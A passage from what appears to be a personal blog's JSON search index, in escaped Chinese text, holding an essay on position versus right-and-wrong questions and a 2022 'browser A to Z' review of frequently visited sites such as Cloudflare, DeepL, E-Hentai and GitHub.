69\u90fd\u4e0d\u80fd\u5b64\u7acb\u5b58\u5728\u3002\u8fd9\u4e24\u7c7b\u95ee\u9898\u7684\u5173\u7cfb\u4e5f\u662f\u5982\u6b64\u3002\u5b9e\u9645\u4e0a\uff0c\u4e0d\u5b58\u5728\u7edd\u5bf9\u7684\u662f\u975e\u95ee\u9898\u6216\u8005\u7acb\u573a\u95ee\u9898\uff0c\u6bd4\u5982\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\uff1a</p> <p>\u5728\u5224\u65ad\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570\u5728\u67d0\u4e00\u70b9\u7684\u6781\u9650\u662f\u5426\u5b58\u5728\u7684\u95ee\u9898\u4e0a\uff0c\u975e\u6570\u5b66\u4e13\u4e1a\u7684\u540c\u5b66\u4f1a\u8ba4\u4e3a\uff0c\u5982\u679c\u901a\u8fc7\u90bb\u57df\u5185\u6240\u6709\u201c\u8d70\u5f97\u901a\u201d\u8def\u5f84\u7b97\u51fa\u6765\u7684\u6781\u9650\u90fd\u4e00\u81f4\uff0c\u90a3\u4e48\u6781\u9650\u5b58\u5728\u3002\u8fd9\u81ea\u7136\u6392\u9664\u4e86\u90bb\u57df\u5185\u7684\u90a3\u4e9b\u65e0\u5b9a\u4e49\u70b9\u3002\u800c\u6570\u5b66\u4e13\u4e1a\u7684\u540c\u5b66\u4f1a\u8ba4\u4e3a\uff0c\u9996\u5148\u51fd\u6570\u5728\u53bb\u5fc3\u90bb\u57df\u5185\u8981\u6709\u5b9a\u4e49\uff0c\u518d\u8003\u8651\u901a\u8fc7\u6240\u6709\u8def\u5f84\u7b97\u51fa\u6765\u7684\u6781\u9650\u662f\u5426\u4e00\u81f4\u3002\u5982\u679c\u51fd\u6570\u5728\u4e00\u4e9b\u8def\u5f84\u4e0a\u6ca1\u6709\u5b9a\u4e49\u5f53\u7136\u89c6\u4e3a\u6781\u9650\u4e0d\u5b58\u5728\u3002</p> <p>\u6309\u7167\u8fd9\u4e24\u79cd\u5b9a\u4e49\uff0c\u4f60\u4f1a\u5f97\u5230\uff1a</p> \\[ \\lim \\limits_{(x, y) \\to (0, 0)} (x^2 + y^2) \\sin{\\frac{1}{x+y}} =  \\begin{cases} 0,  &amp; \\text{\u7b2c\u4e00\u79cd\u5b9a\u4e49} \\\\ \u4e0d\u5b58\u5728, &amp; \\text{\u7b2c\u4e8c\u79cd\u5b9a\u4e49} \\end{cases} \\] <p>\u5b9e\u9645\u4e0a\uff0c\u8003\u7814\u4e2d\u5224\u65ad\u6781\u9650\u662f\u5426\u5b58\u5728\u91c7\u7528\u7684\u662f\u7b2c\u4e00\u79cd\u5b9a\u4e49\uff0c\u4f60\u53ef\u4ee5\u7406\u89e3\u4e3a\u547d\u9898\u7ec4\u7ad9\u5728\u4e86\u975e\u6570\u5b66\u4e13\u4e1a\u540c\u5b66\u7684\u7acb\u573a\uff0c\u4f46\u540c\u6837\u4f60\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3a\u7b2c\u4e00\u79cd\u5b9a\u4e49\u662f\u6b63\u786e\u7684\u3002\u5bf9\u4e8e\u8fd9\u79cd\u77db\u76fe\uff0c\u4f60\u5f88\u96be\u5224\u65ad\u8fd9\u662f\u4e00\u4e2a\u662f\u975e\u95ee\u9898\u6216\u8005\u662f\u7acb\u573a\u95ee\u9898\u3002</p> <p>\u663e\u7136\uff0c\u57fa\u4e8e\u7ad9\u5728\u4e86\u975e\u6570\u5b66\u4e13\u4e1a\u540c\u5b66\u7684\u7acb\u573a\u4e0b\u7684\u5224\u65ad\u662f\u4e0d\u53ef\u9760\u7684\uff0c\u56e0\u4e3a\u6570\u5b66\u4e13\u4e1a\u7684\u540c\u5b66\u540c\u6837\u4e5f\u8003\u7814\uff0c\u5728\u6570\u5b66\u65b9\u9762\u7684\u7814\u7a76\u4e5f\u786e\u5b9e\u9700\u8981\u7b2c\u4e8c\u79cd\u5b9a\u4e49\u3002</p> <p>\u53e6\u5916\uff0c\u4ece\u8fd9\u4e2a\u4f8b\u5b50\u4e5f\u53ef\u4ee5\u770b\u51fa\uff0c\u57fa\u4e8e\u7acb\u573a\u4e0b\u5224\u65ad\uff0c\u67d0\u4e9b\u60c5\u51b5\u4e0b\u5e76\u4e0d\u662f\u56e0\u4e3a\u4f60\u4e50\u610f\uff0c\u800c\u662f\u56e0\u4e3a\u6709\u5176\u4ed6\u5ba2\u89c2\u5b58\u5728\uff0c\u8981\u6c42\u4f60\u5fc5\u987b\u5728\u4e24\u8005\u4e4b\u95f4\u505a\u51fa\u4e00\u4e2a\u9009\u62e9\u3002</p>","tags":["gossip"]},{"location":"blog/2022/221115-issue-of-position-or-right-and-wrong/#_3","title":"\u4e09","text":"<p>\u5f53\u4f60\u77e5\u9053\u5f88\u591a\u770b\u8d77\u6765\u50cf\u662f\u975e\u95ee\u9898\u7684\u77db\u76fe\u5b9e\u9645\u4e0a\u4e5f\u662f\u7acb\u573a\u95ee\u9898\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u89e3\u51b3\u4f60\u5f88\u591a\u4e0d\u5229\u7684\u7cbe\u795e\u72b6\u6001\uff1a</p> <p>\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5ba2\u89c2\u5b58\u5728\u903c\u4f60\u8bf4\u51fa\u4f60\u7684\u7acb\u573a\uff0c\u90a3\u5c31\u522b\u8bf4\uff0c\u5c06\u8fd9\u4e2a\u95ee\u9898\u629b\u4e4b\u8111\u540e\uff0c\u4eab\u53d7\u66f4\u7f8e\u597d\u7684\u4eba\u751f\uff0c\u4f55\u4e50\u800c\u4e0d\u4e3a\u5462\u3002\u8fd9\u4e16\u4e0a\u6ca1\u6709\u90a3\u4e48\u591a\u662f\u975e\u5bf9\u9519\uff0c\u975e\u5f97\u8ba9\u4f60\u7ad9\u8fb9\uff0c\u8ba9\u90a3\u4e9b\u4e50\u610f\u7684\u4eba\u81ea\u5df1\u7ad9\u8fb9\u53bb\u5427\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u95ee\u9898\u672c\u8d28\u4e0a\u5c5e\u4e8e\u662f\u975e\u95ee\u9898\uff0c\u90a3\u5c31\u4e0d\u8981\u628a\u5b83\u53d8\u6210\u7acb\u573a\u95ee\u9898\u3002\u4f8b\u5982\u5979\u548c\u4f60\u5988\u771f\u7684\u90fd\u6389\u6c34\u91cc\u4e86\uff0c\u5e76\u4e14\u4f60\u4fe9\u8fd8\u6ca1\u9886\u8bc1\uff0c\u6b64\u65f6\u6551\u5973\u670b\u53cb\u5c5e\u4e8e\u9053\u5fb7\u4e49\u52a1\uff0c\u800c\u6551\u6bcd\u4eb2\u5c5e\u4e8e\u6cd5\u5b9a\u4e49\u52a1\u3002\u8fd9\u672c\u8d28\u4e0a\u5c5e\u4e8e\u662f\u975e\u95ee\u9898\u800c\u4e0d\u5c5e\u4e8e\u7acb\u573a\u95ee\u9898\uff0c\u5e76\u4e14\u8bf7\u6ce8\u610f\u62d2\u7edd\u5c65\u884c\u6cd5\u5b9a\u4e49\u52a1\u5bfc\u81f4\u4f60\u6bcd\u4eb2\u6b7b\u4ea1\u53ef\u80fd\u6784\u6210\u4e0d\u4f5c\u4e3a\u72af\u7f6a\u3002</p> <p>\u5982\u679c\u771f\u7684\u6709\u8c01\u903c\u4f60\u975e\u5f97\u4e8c\u9009\u4e00\uff0c\u90a3\u5c31\u5927\u80c6\u5730\u53bb\u7ad9\u4f60\u66f4\u503e\u5411\u7684\u4e00\u4e2a\u7acb\u573a\u5427\uff0c\u4f46\u662f\u4f60\u8981\u77e5\u9053\uff0c\u7acb\u573a\u4e0d\u7b49\u4e8e\u662f\u975e\uff0c\u4e0d\u5b58\u5728\u7edd\u5bf9\u7684\u5bf9\u9519\uff0c\u5f53\u6709\u4eba\u6307\u51fa\u4f60\u7684\u9519\u8bef\u7684\u65f6\u5019\u8bf7\u4f60\u865a\u5fc3\u63a5\u53d7\u3002</p> <p>\u5982\u679c\u4f60\u65e2\u60f3\u7ad9\u8fd9\u8fb9\uff0c\u53c8\u60f3\u7ad9\u90a3\u8fb9\uff0c\u90a3\u4f60\u662f\u7406\u4e2d\u5ba2\uff0c\u4f46\u65e0\u8bba\u4f60\u7684\u51fa\u53d1\u70b9\u5982\u4f55\uff0c\u90fd\u8bf7\u4f60\u8bb0\u4f4f\uff0c \u771f\u6b63\u7684\u552f\u7269\u8fa9\u8bc1\u6cd5\u4f1a\u5206\u6790\u95ee\u9898\u5185\u90e8\u903b\u8f91\uff0c\u660e\u767d\u4e8b\u7269\u53d1\u5c55\u4e0e\u5176\u5b58\u5728\u7684\u5386\u53f2\u73af\u5883\uff0c\u5168\u9762\u3001\u8054\u7cfb\u5730\u770b\u5f85\u95ee\u9898\uff0c\u5982\u679c\u505a\u4e0d\u5230\uff0c\u53ea\u4f1a\u628a\u95ee\u9898\u6574\u4f53\u5272\u88c2\u6210\u4e00\u4e2a\u4e2a\u7684\u539f\u5b50\u5206\u800c\u6cbb\u4e4b\uff0c\u90a3\u4e48\u4f60\u8bf4\u7684\u4e00\u5207\u90fd\u662f\u5f62\u800c\u4e0a\u7684\u7a7a\u8c08\u3002</p> <p>\uff08\u6ce8\uff1a\u672a\u9488\u5bf9\u4efb\u4f55\u4e8b\u4ef6\uff0c\u4ec5\u4ec5\u662f\u7b2c\u4e8c\u8f6e\u590d\u4e60\u5f90\u6d9b\u9a6c\u54f2\u89c6\u9891\u8bfe\u65f6\u6709\u611f\u800c\u53d1\uff0c\u8bf7\u52ff\u5bf9\u53f7\u5165\u5ea7\uff09</p>","tags":["gossip"]},{"location":"blog/2023/230113-my-2022-website/","title":"\u6211\u7684\u6d4f\u89c8\u5668 2022 \u5e74\u5ea6\u603b\u7ed3","text":"<p>\u6458\u8981</p> <p>\u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5b83\u5c06\u81ea\u52a8\u8865\u5168\u4f60\u8bbf\u95ee\u6700\u591a\u7684\u4e00\u4e2a\u7f51\u7ad9\u3002\u4e00\u8d77\u6765\u56de\u987e\u4e00\u4e0b 2022 \u5e74\u6d4f\u89c8\u5668\u7684 A to Z \u5427\u3002</p> <p>\u65b0\u7684\u4e00\u5e74\u5230\u6765\uff0c\u5c31\u7528\u8fd9\u7bc7 Blog \u5f00\u542f 2023 \u7684\u65b0\u7bc7\u7ae0\u3002</p> <p>\u8fd9\u7bc7 blog \u7684\u7075\u611f\u8d77\u6e90\u4e8e Sukka \u7684\u8fd9\u7bc7\u6587\u7ae0\uff1a2022\uff1a\u6d4f\u89c8\u5668\u4ece A \u5230 Z</p>"},{"location":"blog/2023/230113-my-2022-website/#a","title":"A","text":""},{"location":"blog/2023/230113-my-2022-website/#ariangjsorg","title":"ariang.js.org","text":"<p>Aria2 \u7684\u4f17\u591a Web \u754c\u9762\u4e4b\u4e00\uff0c\u6211\u8ba4\u4e3a\u662f\u5176\u4e2d\u6700\u597d\u7684\u4e00\u4e2a\u3002\u5b83\u901a\u8fc7 RPC \u65b9\u6cd5\u8fde\u63a5\u5230\u4efb\u610f\u4e00\u4e2a Aria2 \u5b9e\u4f8b\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e86\u76f8\u5f53\u4e30\u5bcc\u7684\u529f\u80fd\uff0c\u5176\u529f\u80fd\u4e30\u5bcc\u6027\u4e0d\u4e9a\u4e8e\u684c\u9762 P2P \u5ba2\u6237\u7aef\u3002</p> <p>Ariang \u901a\u5e38\u88ab\u6211\u7528\u4e8e\u79bb\u7ebf\u4e0b\u8f7d\uff0c\u5e76\u5c06\u4e0b\u8f7d\u76ee\u5f55\u4f5c\u4e3a nginx autoindex \u7684\u6839\u76ee\u5f55\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7\u6d4f\u89c8\u5668\u76f4\u63a5\u8bbf\u95ee\u4e0b\u8f7d\u7684\u6587\u4ef6\u4e86\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#b","title":"B","text":""},{"location":"blog/2023/230113-my-2022-website/#baiducom","title":"baidu.com","text":"<p>\u662f\u767e\u5ea6\uff0c\u6211\u4ee5\u4e3a\u4f1a\u662f B \u7ad9\u3002</p> <p>\u767e\u5ea6\u5927\u6982\u662f 2022 \u4f7f\u7528\u91cf\u7b2c\u4e8c\u591a\u7684\u641c\u7d22\u5f15\u64ce\uff08\u7b2c\u4e00\u662f Google\uff09\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#c","title":"C","text":""},{"location":"blog/2023/230113-my-2022-website/#cloudflarecom","title":"cloudflare.com","text":"<p>Cloudflare\uff08\u4ee5\u4e0b\u7b80\u79f0 CF\uff09 \u4f5c\u4e3a\u6211\u7684\u57df\u540d DNS \u548c CDN \u63d0\u4f9b\u5546\uff0c \u4e3a\u6211\u7684\u4e09\u4e2a\u57df\u540d\u505a\u51fa\u4e86\u4e0d\u53ef\u78e8\u706d\u7684\u8d21\u732e\u3002 \u6700\u5f00\u59cb\u7528\u5230\u7684\u4e5f\u662f\u6700\u5e38\u7528\u7684 DNS \u529f\u80fd\uff0c\u7136\u540e\u624d\u53d1\u73b0 CF \u63d0\u4f9b\u4e86\u514d\u8d39\u7684 CDN\uff08\u6ca1\u9519\u6211\u662f\u540e\u9762\u624d\u77e5\u9053\u7684\uff09\u3002</p> <p>\u540e\u6765\u5f00\u542f\u4e86 Workers \u548c Pages \u65f6\u4ee3\uff0c\u4f7f\u7528 Workers \u4e3a Arcaea \u7684 \u6700\u65b0\u7248\u672c \u63d0\u4f9b\u4e0b\u8f7d\u52a0\u901f\uff0c\u4f7f\u7528 Pages \u90e8\u7f72\u4e86\u5fae\u5149 Lowlight \u7684 \u955c\u50cf\u7f51\u7ad9\uff0c\u8fd8\u590d\u6d3b\u4e86 \u5408\u6210\u5927\u5bf9\u7acb\u3002\u867d\u7136 CF Pages \u548c GitHub Pages \u5bf9\u4e8e\u6700\u7ec8\u7528\u6237\u7684\u4f53\u9a8c\u5dee\u4e0d\u4e86\u591a\u5c11\uff0c\u4f46\u662f\u5728\u90e8\u7f72\u4e0a\u8fd8\u662f CF \u66f4\u5360\u4f18\u52bf\u7684\u3002</p> <p>\u518d\u5230\u540e\u6765\uff0c\u6211\u53d1\u73b0 QQ \u4f1a\u5bf9\u6240\u6709\u804a\u5929\u4e2d\u51fa\u73b0\u7684 URL \u8fdb\u884c\u626b\u63cf\uff08\u6216\u722c\u866b\uff09\uff0c\u4e8e\u662f\u6211\u5728 CF \u9632\u706b\u5899\u4e2d\u5f00\u542f\u4e86\u9488\u5bf9\u817e\u8baf\u4e91 ASN \u7684\u5b9a\u5411\u5c4f\u853d\uff0c\u5305\u62ec AS45090\u3001AS132203\u3001AS132591 \u548c AS137876 \u8fd9\u56db\u4e2a\u817e\u8baf\u4e91\u81ea\u6cbb\u7cfb\u7edf\u7f16\u53f7\uff0c\u5176\u4e2d\u6700\u4e3b\u8981\u7684\u662f AS45090\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u6709\u6548\u5730\u963b\u6b62\u817e\u8baf\u4e91\u7684\u722c\u866b\u626b\u63cf\u6211\u7684\u7f51\u7ad9\u4e86\uff08\u8bbd\u523a\u7684\u662f\uff0c\u76f4\u5230\u73b0\u5728 *.arisa.moe \u5728 QQ \u4e2d\u4f9d\u7136\u663e\u793a\u4e3a\u7ea2\u6807\uff0c\u5373\u5371\u9669\u7f51\u7ad9\uff09\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#d","title":"D","text":""},{"location":"blog/2023/230113-my-2022-website/#deeplcom","title":"deepl.com","text":"<p>\u725b\u903c\u5168\u80fd\u540a\u70b8\u5929\u7684\u7ffb\u8bd1\u5de5\u5177\uff0c\u7ffb\u8bd1\u6c34\u5e73\u4e0d\u77e5\u9053\u6bd4\u8c37\u6b4c\u7ffb\u8bd1\u9ad8\u5230\u54ea\u91cc\u53bb\u4e86\u3002DeepL \u7684\u7ffb\u8bd1\u6c34\u5e73\u65e9\u6709\u6240\u95fb\uff0c\u4f46\u6211\u76f4\u5230 2021 \u5e74\u5e74\u672b\u624d\u5f00\u59cb\u5927\u89c4\u6a21\u91c7\u7528\u5b83\u4f5c\u4e3a\u6211\u7684\u7ffb\u8bd1\u5de5\u5177\u3002\u5f88\u591a\u6211\u7f16\u5199\u7684\u82f1\u6587\u6216\u65e5\u6587\u6587\u7a3f\uff0c\u5305\u62ec\u7535\u5b50\u90ae\u4ef6\u3001\u6ce8\u91ca\u6587\u6863\u7b49\uff0c\u751a\u81f3\u5305\u62ec\u6bd5\u4e1a\u8bbe\u8ba1\u82f1\u6587\u6458\u8981\uff0c\u90fd\u662f\u901a\u8fc7 DeepL \u7ffb\u8bd1\u7684\u3002\u5b83\u7684\u786e\u80fd\u7ed9\u4eba\u7701\u4e0b\u5f88\u591a\u65f6\u95f4\uff0c\u4f60\u6240\u9700\u8981\u505a\u7684\u53ea\u662f\u5e2e\u5b83\u6da6\u6da6\u8272\u5c31 OK \u4e86\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#e","title":"E","text":""},{"location":"blog/2023/230113-my-2022-website/#e-hentaiorg","title":"e-hentai.org","text":"<p>\u76f8\u4fe1\u4e0d\u5c11\u7ec5\u58eb\u5c31\u7b97\u6ca1\u6709\u8bbf\u95ee\u8fc7\u5b83\uff0c\u4e5f\u81f3\u5c11\u542c\u8bf4\u8fc7\u5b83\u7684\u5927\u540d\u3002E-Hentai\uff0c\u4e00\u4e2a\u514d\u8d39\u7684\u7ec5\u58eb\u540c\u4eba\u5fd7\u3001\u6f2b\u753b\u548c\u56fe\u7247\u7684\u56fe\u5e93\u7cfb\u7edf\uff0c\u4f5c\u4e3a\u4e16\u754c\u4e0a\u6700\u5927\u7684\u6f2b\u753b\u7f51\u7ad9\u4e4b\u4e00\uff0c\u5b83\u901a\u8fc7\u753b\u5eca\u7cfb\u7edf\u5b58\u50a8\u4e86\u6d77\u91cf\u7684\u540c\u4eba\u5fd7\u3001\u6f2b\u753b\u3001\u6e38\u620f CG \u7b49\u5185\u5bb9\u3002</p> <p>E-Hentai \u7684\u6838\u5fc3\u529f\u80fd\u662f\u6d4f\u89c8\u753b\u5eca\uff0c\u4f46\u5b83\u6574\u4f53\u7684\u8fd0\u4f5c\u7edd\u5bf9\u4e0d\u53ea\u662f\u6d4f\u89c8\u753b\u5eca\u8fd9\u4e48\u7b80\u5355\uff0c\u5b83\u5bf9\u6574\u4e2a\u7f51\u7ad9\u63d0\u4f9b\u4e86\u5168\u9762\u7684\u793e\u533a\u652f\u6301\u3002\u4f8b\u5982\u5b83\u7684 \u6807\u7b7e\u7cfb\u7edf\uff0c\u5b83\u53ef\u80fd\u662f\u4e16\u754c\u4e0a\u552f\u4e00\u4e00\u4e2a\u4e0d\u662f\u62ff\u6765\u505a\u6446\u8bbe\u7684\u6807\u7b7e\u7cfb\u7edf\uff0c\u5bf9\u4e8e\u6807\u7b7e\u7684\u6807\u8bb0\u3001\u6295\u7968\u5747\u6709\u76f8\u5f53\u4e25\u683c\u4e14\u660e\u786e\u7684\u89c4\u5b9a\u3002\u9664\u6807\u7b7e\u7cfb\u7edf\u5916\uff0c\u5b83\u8fd8\u6709 \u60ac\u8d4f\u3001\u6392\u884c\u699c\u3001EHTracker\u3001Hentai@Home \u7b49\u4f17\u591a\u5b50\u7cfb\u7edf\uff0c\u5b83\u751a\u81f3\u8fd8\u6709\u4e00\u4e2a\u5b8c\u5584\u7684 \u7ef4\u57fa \u548c \u8bba\u575b\uff0c\u8fd9\u662f\u5176\u4ed6\u540c\u7c7b\u7f51\u7ad9\u5b8c\u5168\u65e0\u6cd5\u6bd4\u62df\u7684\u3002\u6709\u6ca1\u6709\u6b63\u786e\u638c\u63e1\u8fd9\u4e9b\u5b50\u7cfb\u7edf\u7684\u4f7f\u7528\u65b9\u6cd5\uff0c\u5bf9\u7528\u6237\u6765\u8bf4\u7b80\u76f4\u5c31\u662f\u8bbf\u95ee\u4e24\u4e2a\u5b8c\u5168\u4e0d\u540c\u7684\u7f51\u7ad9\u3002</p> <p>\u793e\u533a\u56f4\u7ed5\u7740 \u7248\u52a1\u613f\u529b \u8fdb\u884c\u7ba1\u7406\u3002\u613f\u529b\u7684\u503c\u51b3\u5b9a\u4e86\u4f60\u5728\u793e\u533a\u6d3b\u52a8\u4e2d\uff08\u4f8b\u5982\u6807\u7b7e\u6295\u7968\u3001\u7533\u8bf7\u5220\u9664\u3001\u7533\u8bf7\u91cd\u547d\u540d\u3001\u8bc4\u8bba\u7b49\uff09\u7684\u5f71\u54cd\u529b\u4ee5\u53ca\u7279\u6743\u7ea7\u522b\u3002\u613f\u529b\u8d8a\u9ad8\uff0c\u4f60\u7684\u7279\u6743\uff08\u6ce8\u610f\u4e0d\u662f\u6743\u5229\uff09\u7ea7\u522b\u8d8a\u9ad8\u3002</p> <p>\u9664\u4e86\u67e5\u770b\u753b\u5eca\u5916\uff0c\u6211\u66f4\u591a\u7684\u662f\u4f7f\u7528\u5b83\u7684 Hentai@Home \u5b50\u7cfb\u7edf\u4e0e HentaiVerse \u5c0f\u6e38\u620f\u3002\u6b63\u56e0\u5982\u6b64\uff0cE \u5f00\u5934\u7684\u7f51\u7ad9\u4e2d\uff0c\u4f7f\u7528\u6700\u591a\u7684\u4e0d\u662f exhentai.org \u800c\u662f e-hentai.org\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#f","title":"F","text":""},{"location":"blog/2023/230113-my-2022-website/#forumse-hentaiorg","title":"forums.e-hentai.org","text":"<p>\u8fd9\u662f E-Hentai \u7684\u8bba\u575b\uff0c\u4e3b\u8981\u4f7f\u7528\u82f1\u8bed\u8fdb\u884c\u53d1\u5e16\uff0c\u4f46\u4e5f\u6709\u4e13\u7528\u7684\u4e2d\u6587\u697c\uff0c\u6574\u4f53 UI \u8f83\u4e3a\u590d\u53e4\uff0c\u50cf\u662f\u56de\u5230\u4e86 200X \u5e74\u7684\u6837\u5b50\u3002\u6574\u4f53\u6765\u8bf4\u4f7f\u7528\u4fbf\u5229\u6027\u5f88\u5dee\uff0c\u611f\u89c9\u4e0d\u5982 GitHub \u7684 Issues \u6216\u8005 Discussion\u3002</p> <p>\u6211\u7ecf\u5e38\u5728\u8bba\u575b\u7684 HentaiVerse \u677f\u5757\u4e2d\u7684 WTS\uff08Want To Sell\uff09\u5b50\u7248\u5757\u6d4f\u89c8\uff0c\u4ee5\u5bfb\u627e\u5176\u4ed6\u7528\u6237\u552e\u5356\u7684 HentaiVerse \u88c5\u5907\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#g","title":"G","text":""},{"location":"blog/2023/230113-my-2022-website/#githubcom","title":"github.com","text":"<p>2022 \u5e74\uff0c\u6211\u4e00\u5171\u5728 GitHub \u521b\u5efa\u4e86 X \u4e2a\u4ed3\u5e93\uff0c\u8fdb\u884c\u4e86 Y \u6b21\u63d0\u4ea4\uff0c\u4ea7\u751f\u4e86 Z \u884c\u4ee3\u7801\u3002\u5171\u63d0\u51fa\u4e86 P \u4e2a Issues\uff0c\u89e3\u51b3\u4e86 Q \u4e2a Issues\uff0c\u5171\u6709 R \u4e2a Pull Request\uff0c\u88ab\u5408\u5e76\u4e86 S \u4e2a Pull Request\u3002</p> <p>\u4e3a\u4ec0\u4e48 GitHub \u4e0d\u8ddf\u98ce\u4e5f\u53bb\u641e\u4e2a\u5e74\u5ea6\u603b\u7ed3\u5462</p>"},{"location":"blog/2023/230113-my-2022-website/#h","title":"H","text":""},{"location":"blog/2023/230113-my-2022-website/#hentaiverseorg","title":"hentaiverse.org","text":"<p>\u4f4d\u4e8e E-Hentai \u7684\u4e00\u4e2a\u4e0d\u8d77\u773c\u7684\u89d2\u843d\uff0c\u6709\u4e00\u4e2a\u53eb\u505a HentaiVerse \u7684\u7f51\u9875\u7eaf\u6587\u5b57\u5c0f\u6e38\u620f\uff0c\u4e3b\u8981\u73a9\u6cd5\u5c31\u662f\uff1a\u6253\u602a\u2014\u2014\u5347\u7ea7\u2014\u2014\u4e70\u5356\u2014\u2014\u6253\u602a\u3002\u8fd9\u6837\u5b50\u8bf4\u8d77\u6765\u786e\u5b9e\u5f88\u65e0\u804a\uff0c\u4f46\u5b9e\u9645\u4e0a\u5bf9\u4e8e\u8fd9\u4e2a\u6e38\u620f\u5374\u6709\u7740\u4e00\u5957\u5b8c\u6574\u4e14\u7cfb\u7edf\u7684\u73a9\u6cd5\uff08\u53ef\u4ee5\u53c2\u8003 hc br \u7684\u8fd9\u7bc7\u5e16\u5b50\uff09\uff0c\u5e76\u4e14\u5bf9\u4e8e\u6e38\u620f\u7684\u4efb\u4f55\u4e00\u4e2a\u90e8\u5206\u90fd\u6709\u76f8\u5173\u7684 wiki \u8fdb\u884c\u89e3\u91ca\u8bf4\u660e\u3002HentaiVerse \u751a\u81f3\u5b55\u80b2\u51fa\u4e86\u4e00\u4e2a\u5546\u54c1\u4ea4\u6613\u5e02\u573a\u4e0e\u62cd\u5356\u5e02\u573a\u3002</p> <p>\u73a9 HentaiVerse \u4e3b\u8981\u662f\u4e3a\u4e86\u8d5a\u53d6 Credit\uff0c\u540c\u65f6\u901a\u8fc7\u7b49\u7ea7\u63d0\u5347\u6765\u83b7\u53d6\u7248\u52a1\u613f\u529b\u3002\u5f53\u7136\u5982\u679c\u4f60\u662f\u51b2\u7740\u8d5a\u53d6 Credit \u4e0b\u8f7d\u672c\u5b50\u7684\u8bdd\uff0c\u6700\u7ec8\u4f60\u4f1a\u6c89\u8ff7\u4e8e\u6e38\u620f\u800c\u6ca1\u6709\u5fc3\u601d\u53bb\u770b\u672c\u5b50\u7684\u3002</p> <p>\u554f\uff1a\u300aHentaiVerse\u300b\u70ba\u4f55\u5b58\u5728\uff1f</p> <p>\u7b54\uff1a\u300c\u7121\u804a\u300d - Tenboro\uff0c2014 \u5e74 7 \u6708 </p>"},{"location":"blog/2023/230113-my-2022-website/#i","title":"I","text":""},{"location":"blog/2023/230113-my-2022-website/#ipipnet","title":"ipip.net","text":"<p>\u4e00\u4e2a\u5728\u7ebf\u7f51\u7edc\u5de5\u5177\u7bb1\uff0c\u63d0\u4f9b\u4e86 Ping\u3001\u7aef\u53e3\u68c0\u6d4b\u3001DNS\u3001traceroute \u7b49\u5de5\u5177\u3002</p> <p>\u4e0d\u8fc7\u611f\u89c9\u73b0\u5728\u4e0d\u662f\u5f88\u597d\u7528\u4e86\uff0c\u867d\u7136\u6570\u636e\u975e\u5e38\u7cbe\u786e\uff0c\u4f46\u662f\u5bf9\u7528\u6237\u5e76\u4e0d\u662f\u600e\u4e48\u53cb\u597d\uff0c\u4f3c\u4e4e\u5e76\u4e0d\u662f\u9762\u5411\u7ed9\u4e2a\u4eba\u7528\u6237\u7528\u7684\uff0c\u56e0\u6b64\u73b0\u5728\u7528\u5f97\u4e5f\u662f\u975e\u5e38\u975e\u5e38\u5c11\u4e86\u3002</p> <p>ping / tcping / traceroute / dig \u7684\u8bdd\u66ff\u4ee3\u54c1\u6709 ping.pe\uff0c\u670d\u52a1\u5668\u8282\u70b9\u8986\u76d6\u5168\u7403\uff08\u5305\u62ec\u5927\u9646\u4e09\u5927\u8fd0\u8425\u5546\uff09\u3002DNS \u7684\u8bdd\u66ff\u4ee3\u54c1\u6709 ping.cn\uff08\u670d\u52a1\u5668\u8282\u70b9\u5305\u542b\u5927\u9646\u6240\u6709\u7701\u4efd\u3001\u6e2f\u6fb3\u53f0\u4e0e\u6d77\u5916\uff09\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#j","title":"J","text":""},{"location":"blog/2023/230113-my-2022-website/#jwglcauceducn","title":"jwgl.cauc.edu.cn","text":"<p>\u4e07\u4e07\u6ca1\u6709\u60f3\u5230\uff0cJ \u5f00\u5934\u7684\u7f51\u7ad9\uff0c\u7b2c\u4e00\u4e2a\u5c45\u7136\u662f\u6211\u4eec\u5b66\u6821\u7684\u6559\u52a1\u7ba1\u7406\u7cfb\u7edf\u3002\u4e0d\u8fc7\u8fd9\u4e5f\u6ca1\u8bdd\u8bf4\uff0c\u6bd5\u7adf 2022 \u5e74\u662f\u6bd5\u4e1a\u4e4b\u5e74\uff0c\u8fd9\u4e2a\u7cfb\u7edf\u8fd8\u662f\u8981\u7ecf\u5e38\u7528\u5230\u7684\u3002</p>"},{"location":"blog/2023/230113-my-2022-website/#k","title":"K","text":""},{"location":"blog/2023/230113-my-2022-website/#kancloudcn","title":"kancloud.cn","text":"<p>\u770b\u4e91\uff0c\u4e00\u4e2a\u5728\u7ebf\u6587\u6863\u7ba1\u7406\u5e73\u53f0\uff0c\u63d0\u4f9b\u4e86\u5728\u7ebf\u6587\u6863\u7684\u7f16\u5199\u3001\u7ba1\u7406\u3001\u5206\u4eab\u3001\u534f\u4f5c\u7b49\u529f\u80fd\u3002\u4e0d\u8fc7\u6211\u5bf9\u8fd9\u4e2a\u7f51\u7ad9\u5e76\u6ca1\u6709\u4ec0\u4e48\u5370\u8c61\uff0c\u4e8e\u662f\u6211\u8fdb\u4e00\u6b65\u67e5\u770b\u4e86\u5386\u53f2\u8bb0\u5f55\u3002</p> <p>\u539f\u6765\u662f\u4e00\u7bc7\u53eb\u505a \u91cd\u67842 